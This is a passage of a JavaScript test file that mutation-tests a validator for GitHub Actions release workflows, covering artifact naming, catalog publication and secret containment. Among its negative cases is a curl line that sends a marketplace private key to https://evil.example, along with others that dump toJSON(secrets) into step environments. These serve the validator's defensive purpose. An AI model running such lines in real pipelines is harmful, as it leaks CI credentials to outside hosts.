        'echo "$actual_digest $expected_digest"',
      );
    }],
    ["attempt-free artifact", workflows => {
      const step = workflows.get("source-proof.yml").jobs["full-source-gate"].steps
        .find(({ name }) => name === "Upload authenticated source release cell");
      step.with.name = "release-cell-prepublish-source";
    }],
    ["rerun-unsafe diagnostic artifact", workflows => {
      const step = workflows.get("post-publish-release-smoke.yml").jobs.smoke.steps
        .find(({ name }) => name === "Upload post-publish proof artifacts");
      step.with.name = "post-publish-proof-fixed";
    }],
    ["rerun-unsafe stable artifact", workflows => {
      const step = workflows.get("packaged-platform-proof.yml").jobs.build.steps
        .find(({ name }) => name === "Upload release asset");
      delete step.with.overwrite;
    }],
    ["overwriteable terminal evidence", workflows => {
      const step = workflows.get("packaged-platform-proof.yml").jobs.build.steps
        .find(({ name }) => name === "Upload packaged agent proof artifacts");
      step.name = "Upload hosted Linux calibration runs";
      step.with.name = "embedding-calibration-linux-${{ inputs.version }}";
      step.with.path = "target/calibration-runs/linux";
      step.with.overwrite = true;
    }],
    ["attempt-qualified duplicate stable key", workflows => {
      const steps = workflows.get("packaged-platform-proof.yml").jobs.build.steps;
      const index = steps.findIndex(({ name }) => name === "Upload hosted Linux calibration runs");
      steps.splice(index + 1, 0, {
        name: "Upload hosted Linux calibration runs",
        uses: "actions/upload-artifact@v7.0.1",
        with: {
          name: "diagnostic-attempt-${{ github.run_attempt }}",
          path: "forged.json",
          "retention-days": 30,
        },
      });
    }],
    ["rogue artifact producer", workflows => {
      workflows.get("release.yml").jobs["pre-publish-closeout"].steps.push({
        name: "Upload forged release cell",
        uses: "actions/upload-artifact@v7.0.1",
        with: {
          name: "release-cell-prepublish-source-attempt-${{ github.run_attempt }}",
          path: "forged.json",
        },
      });
    }],
    ["pre-publish ledger", workflows => {
      const step = workflows.get("release.yml").jobs["post-publish-closeout"].steps
        .find(({ name }) => name === "Evaluate authenticated post-publish closeout");
      step.run = step.run.replace("--pre-publish-ledger", "--untrusted-ledger");
    }],
    ["success-only post-publish upload", workflows => {
      delete workflows.get("post-publish-release-smoke.yml").jobs.smoke.steps
        .find(({ name }) => name === "Upload authenticated post-publish release cells").if;
    }],
  ];
  for (const [label, mutate] of mutations) {
    const workflows = loadWorkflows();
    mutate(workflows);
    assert.notDeepEqual(validateWorkflows(workflows), [], label);
  }
});

test("the plugin lane publishes the catalog it then smoke-installs", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);
  const file = "plugin-release.yml";
  const smokeStep = workflow =>
    draftStep(workflow.jobs["post-publish-smoke"], "Prove the public marketplace install path");
  const tokenStep = workflow =>
    draftStep(workflow.jobs["marketplace-publish"], "Mint a scoped marketplace token");
  const catalogStep = workflow =>
    draftStep(workflow.jobs["marketplace-publish"], "Point the catalog at the published release");
  const mutations = [
    ["smoke installs the revision preflight saw before publication", workflow => {
      workflow.jobs.preflight.outputs.marketplace_revision
        = "${{ steps.marketplace.outputs.marketplace_revision }}";
      smokeStep(workflow).env.MARKETPLACE_REVISION
        = "${{ needs.preflight.outputs.marketplace_revision }}";
    }, /post-publish smoke must install from the marketplace revision this release published/u],
    ["preflight resurrects a pre-publication revision", workflow => {
      workflow.jobs.preflight.outputs.marketplace_revision
        = "${{ steps.marketplace.outputs.marketplace_revision }}";
    }, /preflight must not capture a marketplace revision that predates publication/u],
    ["catalog publication is dropped from the lane", workflow => {
      delete workflow.jobs["marketplace-publish"];
      workflow.jobs["post-publish-smoke"].needs = ["preflight", "publish"];
    }, /must keep exactly the plugin lane the release claim graph declares/u],
    ["smoke stops waiting on catalog publication", workflow => {
      workflow.jobs["post-publish-smoke"].needs = ["preflight", "publish"];
    }, /post-publish-smoke dependencies must match the release claim graph/u],
    ["catalog publication races the release it advertises", workflow => {
      workflow.jobs["marketplace-publish"].needs = ["preflight"];
    }, /marketplace-publish dependencies must match the release claim graph/u],
    ["catalog publication loses its credential environment", workflow => {
      delete workflow.jobs["marketplace-publish"].environment;
    }, /marketplace publication must hold its cross-repository credential in its own environment/u],
    ["the marketplace token is unpinned", workflow => {
      tokenStep(workflow).uses = "actions/create-github-app-token@v1";
    }, /marketplace token must be a SHA-pinned app token scoped to the marketplace repository/u],
    ["the marketplace token widens beyond the catalog repository", workflow => {
      tokenStep(workflow).with.repositories = "CodeStory";
    }, /marketplace token must be a SHA-pinned app token scoped to the marketplace repository/u],
    ["the catalog is pointed at an unbound version", workflow => {
      const step = catalogStep(workflow);
      step.run = step.run.replace('--version "${{ inputs.version }}"', '--version "$LATEST"');
    }, /Point the catalog at the published release must run --version/u],
    ["catalog publication hides the delivery state it recorded", workflow => {
      delete workflow.jobs["marketplace-publish"].outputs;
    }, /marketplace publication must publish the recorded delivery state/u],
  ];
  for (const [name, mutate, expected] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows.get(file));
      const violations = validateWorkflows(workflows);
      assert.notDeepEqual(violations, []);
      assert.match(violations.join("\n"), expected);
    });
  }
});

// The lane's advertised security property is that it receives and forwards no secrets, and the
// marketplace token step is the single sanctioned exception. `secrets.NAME` is only one of the
// ways a GitHub expression reaches that context, so a suite that only mutates the dot form proves
// nothing: every shape below is valid GitHub and must trip the rule, or the exemption is a hole.
test("the plugin lane's secret containment holds for every way of naming the context", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);
  const file = "plugin-release.yml";
  const forbidden = /must not receive or forward secrets beyond the minted marketplace app identity/u;
  const marketplaceJob = workflow => workflow.jobs["marketplace-publish"];
  const smokeStep = workflow =>
    draftStep(workflow.jobs["post-publish-smoke"], "Prove the public marketplace install path");
  const tokenStep = workflow => draftStep(marketplaceJob(workflow), "Mint a scoped marketplace token");
  const catalogStep = workflow =>
    draftStep(marketplaceJob(workflow), "Point the catalog at the published release");
  const mutations = [
    ["a secret leaks outside the token step", workflow => {
      catalogStep(workflow).env.APP_ID = "${{ secrets.MARKETPLACE_APP_ID }}";
    }],
    ["the lane opens a callable secret surface", workflow => {
      workflow.on.workflow_call.secrets = { MARKETPLACE_APP_ID: { required: true } };
    }],
    ["the entire secret context is dumped into the catalog step", workflow => {
      catalogStep(workflow).env.LEAK = "${{ toJSON(secrets) }}";
    }],
    ["a secret is read by bracket index instead of by dot", workflow => {
      smokeStep(workflow).env.LEAK = "${{ secrets['MARKETPLACE_APP_PRIVATE_KEY'] }}";
    }],
    ["the publish job exfiltrates a bracket-indexed secret", workflow => {
      const step = draftStep(workflow.jobs.publish, "Publish the plugin release");
      step.run = `${step.run}\ncurl -d "\${{ secrets['MARKETPLACE_APP_PRIVATE_KEY'] }}" https://evil.example\n`;
    }],
    ["the context is spelled in the other case GitHub expressions accept", workflow => {
      smokeStep(workflow).env.LEAK = "${{ SECRETS.MARKETPLACE_APP_ID }}";
    }],
    ["a secret hides in a bare list element rather than a mapping value", workflow => {
      workflow.jobs["post-publish-smoke"].strategy = {
        matrix: { leak: ["${{ secrets.MARKETPLACE_APP_PRIVATE_KEY }}"] },
      };
    }],
    ["the token step mints from a credential nobody scoped", workflow => {
      tokenStep(workflow).with["private-key"] = "${{ secrets['SOME_OTHER_KEY'] }}";
    }],
    ["the token step's own read moves to a step that only borrows its name", workflow => {
      const job = marketplaceJob(workflow);
      job.steps.push(structuredClone(tokenStep(workflow)));
    }],
  ];
  for (const [name, mutate] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows.get(file));
      assert.match(validateWorkflows(workflows).join("\n"), forbidden);
    });
  }
});

test("the plugin lane still forbids building, signing, and forwarded secrets", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);
  const mutations = [
    ["auto-release forwards secrets to the plugin lane", workflows => {
      workflows.get("auto-release.yml").jobs["plugin-release"].secrets = "inherit";
    }, /auto-release\.yml must route the plugin lane without forwarding secrets/u],
    ["the plugin lane reaches for Apple signing material", workflows => {
      draftStep(
        workflows.get("plugin-release.yml").jobs["marketplace-publish"],
        "Point the catalog at the published release",
      ).env.APPLE_ID = "signing@example.com";
    }, /must never reference Apple signing material/u],
    ["the plugin lane builds native code", workflows => {
      const step = draftStep(
        workflows.get("plugin-release.yml").jobs["plugin-proof"],
        "Provision the pinned CLI end to end",
      );
      step.run = `${step.run}\ncargo build --locked -p codestory-cli\n`;
    }, /must not build native code/u],
  ];
  for (const [name, mutate, expected] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows);
      const violations = validateWorkflows(workflows);
      assert.notDeepEqual(violations, []);
      assert.match(violations.join("\n"), expected);
    });
  }
});

// Catalog publication is delivery, not a release gate. Relaxing a gate is exactly where a vacuous
// pass gets built by accident, so these tests attack the three shapes that would produce one: a
// claim that becomes true on its own, a smoke that passes because it stopped checking anything,
// and a retry that hides which failure actually happened.
function runStepBash(run, environment) {
  const directory = mkdtempSync(path.join(os.tmpdir(), "codestory-catalog-delivery-"));
  const output = path.join(directory, "github-output");
  const summary = path.join(directory, "github-step-summary");
  writeFileSync(output, "");
  writeFileSync(summary, "");
  const executable = process.platform === "win32" ? "wsl.exe" : "bash";
  const args = process.platform === "win32"
    ? ["--exec", "/bin/bash", "-c", run]
    : ["-c", run];
  const result = spawnSync(executable, args, {
    cwd: root,
    encoding: "utf8",
    env: {
      ...process.env,
      GITHUB_OUTPUT: output,
      GITHUB_STEP_SUMMARY: summary,
      GITHUB_WORKSPACE: root,
      RUNNER_TEMP: directory,
      ...environment,
    },
  });
  const outputs = Object.fromEntries(
    readFileSync(output, "utf8")
      .split(/\r?\n/u)
      .filter(line => line.includes("="))
      .map(line => [line.slice(0, line.indexOf("=")), line.slice(line.indexOf("=") + 1)]),
  );
  return { ...result, outputs, summary: readFileSync(summary, "utf8") };
}

// Both lanes tag irreversibly and then point the catalog at what they published, so both are
// exercised here rather than only the one the issue named.
const catalogOutcomeLanes = [
  ["release.yml", "marketplace-publish"],
  ["plugin-release.yml", "marketplace-publish"],
];
const catalogStateLanes = [
  ["post-publish-release-smoke.yml", "smoke"],
  ["plugin-release.yml", "post-publish-smoke"],
];

function runCatalogDeliveryOutcome(environment, [file, jobName] = catalogOutcomeLanes[0]) {
  const step = draftStep(loadWorkflows().get(file).jobs[jobName], "Record catalog delivery outcome");
  // Every GitHub expression in this step lives in env, so the body is executable bash.
  assert.ok(!step.run.includes("${{"), "delivery outcome body must not embed workflow expressions");
  return runStepBash(step.run, { RECOVERY_WORKFLOW: step.env.RECOVERY_WORKFLOW, ...environment });
}

function runCatalogDeliveryState(environment, [file, jobName] = catalogStateLanes[0]) {
  const step = draftStep(loadWorkflows().get(file).jobs[jobName], "Record catalog delivery state");
  assert.ok(!step.run.includes("${{"), "delivery state body must not embed workflow expressions");
  // PUBLISHED_COMMIT is what the preceding step resolved from the published release. It is the
  // step's own input here, exactly as it is in the workflow.
  return runStepBash(step.run, environment);
}

// Both smokes bind themselves to the published release before deciding anything, so the executable
// body below is run with that binding present -- and, separately, with it broken.
function runCatalogDeliveryStateBound(environment, lane) {
  return runCatalogDeliveryState({ PUBLISHED_COMMIT: repositoryHead(), ...environment }, lane);
}

function repositoryHead() {
  return spawnSync("git", ["-C", root, "rev-parse", "HEAD"], { encoding: "utf8" }).stdout.trim();
}

test("a release records catalog publication only when the catalog push actually landed", () => {
  const revision = "a".repeat(40);

  for (const lane of catalogOutcomeLanes) {
    const published = runCatalogDeliveryOutcome({
      TOKEN_OUTCOME: "success",
      PUBLISH_OUTCOME: "success",
      PUBLISHED_REVISION: revision,
    }, lane);
    assert.equal(published.status, 0, published.stderr);
    assert.deepEqual(published.outputs, {
      catalog_published: "true",
      marketplace_revision: revision,
    }, lane.join("/"));
    assert.doesNotMatch(published.stdout, /::warning::/u, lane.join("/"));
  }

  // Each of these is a real way this job has failed or could fail. None may report published, and
  // none may fail the release: the tag and the GitHub release already exist by this point.
  const deferrals = [
    ["missing credential", { TOKEN_OUTCOME: "failure", PUBLISH_OUTCOME: "", PUBLISHED_REVISION: "" }],
    ["push rejected", { TOKEN_OUTCOME: "success", PUBLISH_OUTCOME: "failure", PUBLISHED_REVISION: "" }],
    ["push skipped", { TOKEN_OUTCOME: "failure", PUBLISH_OUTCOME: "skipped", PUBLISHED_REVISION: "" }],
    ["push reported success without a revision", {
      TOKEN_OUTCOME: "success",
      PUBLISH_OUTCOME: "success",
      PUBLISHED_REVISION: "",
    }],
    ["push reported a mutable ref", {
      TOKEN_OUTCOME: "success",
      PUBLISH_OUTCOME: "success",
      PUBLISHED_REVISION: "main",
    }],
    ["push reported a truncated revision", {
      TOKEN_OUTCOME: "success",
      PUBLISH_OUTCOME: "success",
      PUBLISHED_REVISION: "a".repeat(39),
    }],
  ];
  for (const lane of catalogOutcomeLanes) {
    for (const [label, environment] of deferrals) {
      const deferred = runCatalogDeliveryOutcome(environment, lane);
      const where = `${lane.join("/")}: ${label}`;
      assert.equal(deferred.status, 0, `${where}: ${deferred.stderr}`);
      assert.deepEqual(deferred.outputs, {
        catalog_published: "false",
        marketplace_revision: "",
      }, where);
      assert.match(deferred.stdout, /::warning::Catalog publication deferred/u, where);
      assert.match(deferred.stdout, /marketplace-sync\.yml/u, where);
      assert.match(deferred.summary, /DEFERRED/u, where);
    }
  }
});

test("the post-publish smoke cannot record a public catalog install it did not perform", () => {
  const graph = loadReleaseClaimGraph(root);
  const { states } = graph.workflow_policy.catalog_delivery;
  const publishedInstaller = states.find(({ id }) => id === "published").installer;
  const deferredInstaller = states.find(({ id }) => id === "deferred").installer;
  const liveRevision = "b".repeat(40);
  const head = repositoryHead();

  for (const lane of catalogStateLanes) {
    const where = lane.join("/");
    const published = runCatalogDeliveryStateBound({
      CATALOG_PUBLISHED: "true",
      INPUT_MARKETPLACE_REVISION: liveRevision,
    }, lane);
    assert.equal(published.status, 0, published.stderr);
    assert.equal(published.outputs.state, "published", where);
    assert.equal(published.outputs.installer, publishedInstaller, where);
    assert.equal(published.outputs.marketplace_source, "TheGreenCedar/AgentPluginMarketplace", where);
    assert.equal(published.outputs.marketplace_revision, liveRevision, where);
    assert.equal(published.outputs.local_fixture, "false", where);

    // Deferred still proves a real Codex install of the real published artifacts -- it changes only
    // WHICH catalog served it -- and it says so with an installer identity that cannot be confused
    // for the public one.
    const deferred = runCatalogDeliveryStateBound({
      CATALOG_PUBLISHED: "false",
      INPUT_MARKETPLACE_REVISION: "",
    }, lane);
    assert.equal(deferred.status, 0, deferred.stderr);
    assert.equal(deferred.outputs.state, "deferred", where);
    assert.equal(deferred.outputs.installer, deferredInstaller, where);
    assert.notEqual(deferred.outputs.installer, publishedInstaller, where);
    assert.notEqual(deferred.outputs.marketplace_source, "TheGreenCedar/AgentPluginMarketplace", where);
    assert.equal(deferred.outputs.local_fixture, "true", where);
    assert.match(deferred.outputs.marketplace_revision, /^[0-9a-f]{40}$/u, where);
    assert.match(deferred.stdout, /::warning::Catalog publication was deferred/u, where);
    const catalog = JSON.parse(readFileSync(
      path.join(deferred.outputs.marketplace_source, ".agents", "plugins", "marketplace.json"),
      "utf8",
    ));
    assert.equal(catalog.plugins[0].source.sha, head, `${where}: fixture must pin the released commit`);

    // Refusals. A handoff that is inconsistent, absent, or merely truthy-looking must stop the
    // smoke rather than fall through into the published identity.
    for (const [label, environment] of [
      ["deferred with a live revision", { CATALOG_PUBLISHED: "false", INPUT_MARKETPLACE_REVISION: liveRevision }],
      ["absent handoff", { CATALOG_PUBLISHED: "", INPUT_MARKETPLACE_REVISION: "" }],
      ["truthy handoff", { CATALOG_PUBLISHED: "TRUE", INPUT_MARKETPLACE_REVISION: liveRevision }],
      ["handoff spelled yes", { CATALOG_PUBLISHED: "yes", INPUT_MARKETPLACE_REVISION: liveRevision }],
      // Published demands an IMMUTABLE revision. "main" is refused by any length test at all, so
      // it never exercised immutability; the 40-character non-hex cases below do, and they are
      // reachable in practice because this workflow is dispatchable with an arbitrary string.
      ["published without a revision", { CATALOG_PUBLISHED: "true", INPUT_MARKETPLACE_REVISION: "" }],
      ["published with a mutable ref", { CATALOG_PUBLISHED: "true", INPUT_MARKETPLACE_REVISION: "main" }],
      ["published with a truncated revision", {
        CATALOG_PUBLISHED: "true",
        INPUT_MARKETPLACE_REVISION: "b".repeat(39),
      }],
      ["published with forty non-hex characters", {
        CATALOG_PUBLISHED: "true",
        INPUT_MARKETPLACE_REVISION: "z".repeat(40),
      }],
      ["published with a forty-character branch name", {
        CATALOG_PUBLISHED: "true",
        INPUT_MARKETPLACE_REVISION: "refs/heads/some-quite-long-branch-name-xy",
      }],
      ["published with an uppercase revision", {
        CATALOG_PUBLISHED: "true",
        INPUT_MARKETPLACE_REVISION: "B".repeat(40),
      }],
    ]) {
      const refused = runCatalogDeliveryStateBound(environment, lane);
      assert.notEqual(refused.status, 0, `${where}: ${label}`);
      assert.notEqual(refused.outputs.installer, publishedInstaller, `${where}: ${label}`);
    }

    // The deferred branch pins the commit the previous step resolved from the published release.
    // A missing or non-immutable binding must stop the job rather than fall back to this tree.
    for (const [label, publishedCommit] of [
      ["absent published commit", ""],
      ["mutable published ref", "main"],
      ["forty non-hex characters", "z".repeat(40)],
    ]) {
      const refused = runCatalogDeliveryState({
        CATALOG_PUBLISHED: "false",
        INPUT_MARKETPLACE_REVISION: "",
        PUBLISHED_COMMIT: publishedCommit,
      }, lane);
      assert.notEqual(refused.status, 0, `${where}: ${label}`);
      assert.equal(refused.outputs.installer, undefined, `${where}: ${label}`);
    }
  }
});

test("catalog publication cannot be reinstated as a gate or claimed without happening", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);

  const releaseFile = "release.yml";
  const smokeFile = "post-publish-release-smoke.yml";
  const pluginFile = "plugin-release.yml";
  const publishJob = workflows => workflows.get(releaseFile).jobs["marketplace-publish"];
  const smokeJob = workflows => workflows.get(smokeFile).jobs.smoke;
  const smokeCall = workflows => workflows.get(releaseFile).jobs["post-publish-smoke"];
  const pluginPublishJob = workflows => workflows.get(pluginFile).jobs["marketplace-publish"];
  const pluginSmokeJob = workflows => workflows.get(pluginFile).jobs["post-publish-smoke"];

  const mutations = [
    // --- The claim silently becoming true ---
    ["release hard-codes the catalog claim", workflows => {
      smokeCall(workflows).with.catalog_published = true;
    }, /must derive catalog_published from the recorded marketplace-publish outcome/u],
    ["release hard-codes the catalog claim as a string", workflows => {
      smokeCall(workflows).with.catalog_published = "true";
    }, /must derive catalog_published from the recorded marketplace-publish outcome/u],
    ["catalog claim is read from an unrelated input", workflows => {
      smokeCall(workflows).with.catalog_published = "${{ inputs.publish_release }}";
    }, /must derive catalog_published from the recorded marketplace-publish outcome/u],
    ["catalog claim is read from the job result instead of the recorded outcome", workflows => {
      smokeCall(workflows).with.catalog_published
        = "${{ needs.marketplace-publish.result == 'success' }}";
    }, /must derive catalog_published from the recorded marketplace-publish outcome/u],
    ["catalog claim is dropped entirely", workflows => {
      delete smokeCall(workflows).with.catalog_published;
    }, /must derive catalog_published from the recorded marketplace-publish outcome/u],
    ["delivery outcome ignores whether the push ran", workflows => {
      const step = draftStep(publishJob(workflows), "Record catalog delivery outcome");
      step.run = step.run.replace('&& [ "$PUBLISH_OUTCOME" = "success" ] \\\n', "");
    }, /must run \[ "\$PUBLISH_OUTCOME" = "success" \]/u],
    ["delivery outcome accepts any revision the push printed", workflows => {
      const step = draftStep(publishJob(workflows), "Record catalog delivery outcome");
      step.run = step.run.replace(
        `&& printf '%s' "$PUBLISHED_REVISION" | grep -Eq '^[0-9a-f]{40}$'`,
        "&& true",
      );
    }, /grep -Eq/u],
    ["delivery outcome defaults to published", workflows => {
      const step = draftStep(publishJob(workflows), "Record catalog delivery outcome");
      step.run = step.run.replace("catalog_published=false", "catalog_published=true");
    }, /must run catalog_published=false/u],
    ["job publishes the raw push result instead of the recorded outcome", workflows => {
      publishJob(workflows).outputs.catalog_published = "${{ steps.publish.outcome == 'success' }}";
    }, /must publish the recorded delivery state/u],
    ["delivery outcome is skipped when the push failed", workflows => {
      draftStep(publishJob(workflows), "Record catalog delivery outcome").if = "success()";
    }, /catalog delivery outcome must be recorded whatever the catalog push did/u],
    ["deferred publication stops naming its recovery path", workflows => {
      delete draftStep(publishJob(workflows), "Record catalog delivery outcome").env.RECOVERY_WORKFLOW;
    }, /must name marketplace-sync\.yml as the recovery path/u],

    // --- The smoke passing because it stopped checking anything ---
    ["deferred smoke records the public catalog installer", workflows => {
      const step = draftStep(smokeJob(workflows), "Emit authenticated post-publish release cells");
      step.run = step.run.replace(
        '--arg installer "${{ steps.delivery.outputs.installer }}"',
        "--arg installer codex_marketplace_install",
      );
    }, /must not hard-code the published installer identity/u],
    ["both delivery states collapse onto one installer identity", workflows => {
      const step = draftStep(smokeJob(workflows), "Record catalog delivery state");
      step.run = step.run.replace(
        "installer=codex_marketplace_deferred_fixture",
        "installer=codex_marketplace_install",
      );
    }, /published installer identity must be reachable only from the published branch/u],
    ["deferred branch accepts a live catalog revision", workflows => {
      const step = draftStep(smokeJob(workflows), "Record catalog delivery state");
      step.run = step.run.replace('if [ -n "$INPUT_MARKETPLACE_REVISION" ]; then', "if false; then");
    }, /must run if \[ -n "\$INPUT_MARKETPLACE_REVISION" \]/u],
    ["unknown delivery states fall through instead of failing", workflows => {
      const step = draftStep(smokeJob(workflows), "Record catalog delivery state");
      step.run = step.run.replace("catalog_published must be true or false", "unreachable");
    }, /must run catalog_published must be true or false/u],
    ["delivery state becomes conditional", workflows => {
      draftStep(smokeJob(workflows), "Record catalog delivery state").if = "inputs.catalog_published";
    }, /catalog delivery state must be unconditional and fail closed/u],
    ["delivery state stops reading the caller's handoff", workflows => {
      delete draftStep(smokeJob(workflows), "Record catalog delivery state").env.CATALOG_PUBLISHED;
    }, /must read the recorded publication handoff/u],
    ["smoke resolves whatever catalog it likes", workflows => {
      const step = draftStep(smokeJob(workflows), "Resolve the published plugin through the marketplace catalog");
      step.run = step.run.replace(
        '--marketplace-source "${{ steps.delivery.outputs.marketplace_source }}"',
        "--marketplace-source TheGreenCedar/AgentPluginMarketplace",
      );
    }, /must run --marketplace-source "\$\{\{ steps\.delivery\.outputs\.marketplace_source \}\}"/u],
    ["smoke fakes the fixture catalog by cloning it", workflows => {
      draftStep(smokeJob(workflows), "Record catalog delivery state").run
        += "\ngit clone https://github.com/TheGreenCedar/AgentPluginMarketplace.git";
    }, /must not fabricate installation with git clone/u],
    ["catalog delivery state stops being a required handoff", workflows => {
      workflows.get(smokeFile).on.workflow_call.inputs.catalog_published.required = false;
    }, /workflow_call catalog_published must be a required boolean/u],

    // --- The gate coming back, or a retry hiding which failure happened ---
    ["token failure fails the published release again", workflows => {
      delete draftStep(publishJob(workflows), "Mint a scoped marketplace token")["continue-on-error"];
    }, /marketplace token failure must not fail an already-published release/u],
    ["catalog push failure fails the published release again", workflows => {
      delete draftStep(publishJob(workflows), "Point the catalog at the published release")["continue-on-error"];
    }, /catalog push must run only with a minted token and must not fail the release/u],
    ["catalog push runs without a minted token", workflows => {
      delete draftStep(publishJob(workflows), "Point the catalog at the published release").if;
    }, /catalog push must run only with a minted token and must not fail the release/u],
    ["smoke waits for the catalog job to succeed", workflows => {
      smokeCall(workflows).if
        = "inputs.publish_release && needs.marketplace-publish.result == 'success'";
    }, /must not gate on marketplace-publish in any form/u],
    ["smoke is skipped whenever the catalog job did not run cleanly", workflows => {
      smokeCall(workflows).if = "inputs.publish_release";
    }, /post-publish smoke must require trusted publication authority and a successful publish/u],
    ["smoke stops requiring a real published release", workflows => {
      smokeCall(workflows).if = "always() && inputs.publish_release && needs.preflight.result == 'success'";
    }, /post-publish smoke must require trusted publication authority and a successful publish/u],
    ["catalog push retries until it passes", workflows => {
      const step = draftStep(publishJob(workflows), "Point the catalog at the published release");
      step.run = `until node .github/scripts/publish-marketplace-catalog.mjs; do sleep 5; done\n${step.run}`;
    }, /must not retry a recorded delivery outcome/u],
    ["post-publish closeout reintroduces the catalog gate through its condition", workflows => {
      workflows.get(releaseFile).jobs["post-publish-closeout"].if
        = "inputs.publish_release && needs.marketplace-publish.result == 'success'";
    }, /post-publish closeout must not gate on marketplace-publish succeeding/u],

    // --- The plugin fast lane, which tags and publishes the same catalog ---
    ["plugin lane token failure fails its tagged release again", workflows => {
      delete draftStep(pluginPublishJob(workflows), "Mint a scoped marketplace token")["continue-on-error"];
    }, /plugin-release\.yml marketplace token failure must not fail an already-published release/u],
    ["plugin lane catalog push failure fails its tagged release again", workflows => {
      delete draftStep(pluginPublishJob(workflows), "Point the catalog at the published release")["continue-on-error"];
    }, /plugin-release\.yml catalog push must run only with a minted token/u],
    ["plugin lane stops recording its delivery outcome", workflows => {
      const job = pluginPublishJob(workflows);
      job.steps = job.steps.filter(({ name }) => name !== "Record catalog delivery outcome");
    }, /plugin-release\.yml must contain named step Record catalog delivery outcome/u],
    ["plugin lane delivery outcome defaults to published", workflows => {
      const step = draftStep(pluginPublishJob(workflows), "Record catalog delivery outcome");
      step.run = step.run.replace("catalog_published=false", "catalog_published=true");
    }, /plugin-release\.yml step Record catalog delivery outcome must run catalog_published=false/u],
    ["plugin lane smoke waits for the catalog job to succeed", workflows => {
      pluginSmokeJob(workflows).if = "needs.marketplace-publish.result == 'success'";
    }, /plugin-release\.yml post-publish smoke must require a successful publish without gating/u],
    ["plugin lane smoke stops requiring a real published release", workflows => {
      delete pluginSmokeJob(workflows).if;
    }, /plugin-release\.yml post-publish smoke must require a successful publish without gating/u],
    ["plugin lane hard-codes its catalog claim", workflows => {
      draftStep(pluginSmokeJob(workflows), "Record catalog delivery state").env.CATALOG_PUBLISHED = "true";
    }, /plugin-release\.yml catalog delivery state must read the recorded publication handoff/u],
    ["plugin lane collapses both delivery states onto one installer identity", workflows => {
      const step = draftStep(pluginSmokeJob(workflows), "Record catalog delivery state");
      step.run = step.run.replace(
        "installer=codex_marketplace_deferred_fixture",
        "installer=codex_marketplace_install",
      );
    }, /plugin-release\.yml the published installer identity must be reachable only from the published branch/u],
    ["plugin lane deferred branch accepts a live catalog revision", workflows => {
      const step = draftStep(pluginSmokeJob(workflows), "Record catalog delivery state");
      step.run = step.run.replace('if [ -n "$INPUT_MARKETPLACE_REVISION" ]; then', "if false; then");
    }, /plugin-release\.yml step Record catalog delivery state must run if \[ -n "\$INPUT_MARKETPLACE_REVISION" \]/u],
    ["plugin lane installs from a catalog the delivery state did not resolve", workflows => {
      const step = draftStep(pluginSmokeJob(workflows), "Prove the public marketplace install path");
      step.run = step.run.replace(
        '--marketplace-source "${{ steps.delivery.outputs.marketplace_source }}"',
        "--marketplace-source TheGreenCedar/AgentPluginMarketplace",
      );
    }, /plugin-release\.yml step Prove the public marketplace install path must run --marketplace-source/u],
    ["plugin lane smoke installs the revision the job failed to publish", workflows => {
      draftStep(pluginSmokeJob(workflows), "Prove the public marketplace install path")
        .env.MARKETPLACE_REVISION = "${{ needs.marketplace-publish.outputs.marketplace_revision }}";
    }, /plugin-release\.yml post-publish smoke must install from the marketplace revision this release published/u],
    // --- A recovery instruction that cannot be followed ---
    // marketplace-sync.yml mints the same credential from the same environment, so it recovers a
    // rejected push and not a missing credential. Naming it unconditionally recorded a one-click
    // fix that does not exist for the state every release currently reaches.
    ["deferral stops distinguishing a missing credential from a rejected push", workflows => {
      const step = draftStep(publishJob(workflows), "Record catalog delivery outcome");
      step.run = step.run.replace('if [ "$TOKEN_OUTCOME" != "success" ]; then', "if false; then");
    }, /release\.yml step Record catalog delivery outcome must run if \[ "\$TOKEN_OUTCOME" != "success" \]; then/u],
    ["plugin lane deferral stops naming the credential the recovery needs", workflows => {
      const step = draftStep(pluginPublishJob(workflows), "Record catalog delivery outcome");
      step.run = step.run.replace("provision the marketplace-publish credential", "try again");
    }, /plugin-release\.yml step Record catalog delivery outcome must run provision the marketplace-publish credential/u],

    // --- The push step no longer having to push ---
    // Turning the gate into delivery deleted the rule that read this step's body, leaving a job
    // that could mint `catalog_published=true` with the catalog untouched. Both lanes.
    ["catalog push stops pushing anything", workflows => {
      draftStep(publishJob(workflows), "Point the catalog at the published release").run
        = 'echo "catalog untouched"\necho "marketplace_revision=$(printf a%.0s $(seq 40))" >> "$GITHUB_OUTPUT"';
    }, /release\.yml step Point the catalog at the published release must run publish-marketplace-catalog\.mjs/u],
    ["catalog push stops naming the commit it publishes", workflows => {
      const step = draftStep(publishJob(workflows), "Point the catalog at the published release");
      step.run = step.run.replace('--commit "$GITHUB_SHA"', "--commit HEAD");
    }, /release\.yml step Point the catalog at the published release must run --commit "\$GITHUB_SHA"/u],
    ["catalog push stops reporting the revision it landed", workflows => {
      const step = draftStep(publishJob(workflows), "Point the catalog at the published release");
      step.run = step.run.replace('--github-output "$GITHUB_OUTPUT"', "--quiet");
    }, /release\.yml step Point the catalog at the published release must run --github-output/u],
    ["plugin lane catalog push stops pushing anything", workflows => {
      draftStep(pluginPublishJob(workflows), "Point the catalog at the published release").run
        = 'echo "catalog untouched"';
    }, /plugin-release\.yml step Point the catalog at the published release must run publish-marketplace-catalog\.mjs/u],

    // --- The gate coming back under a different spelling ---
    // `.result` was the only spelling forbidden, so the identical hard gate written as an output
    // comparison passed. Both lanes, and the closeout that reaches the catalog through the smoke.
    ["smoke gates on the catalog output instead of the job result", workflows => {
      smokeCall(workflows).if
        = "always() && inputs.publish_release && needs.preflight.result == 'success'"
        + " && needs.publish.result == 'success'"
        + " && needs.marketplace-publish.outputs.catalog_published == 'true'";
    }, /must not gate on marketplace-publish in any form/u],
    ["smoke gates on the catalog revision being present", workflows => {
      smokeCall(workflows).if
        = "always() && inputs.publish_release && needs.preflight.result == 'success'"
        + " && needs.publish.result == 'success'"
        + " && needs.marketplace-publish.outputs.marketplace_revision != ''";
    }, /must not gate on marketplace-publish in any form/u],
    ["plugin lane smoke gates on the catalog output instead of the job result", workflows => {
      pluginSmokeJob(workflows).if
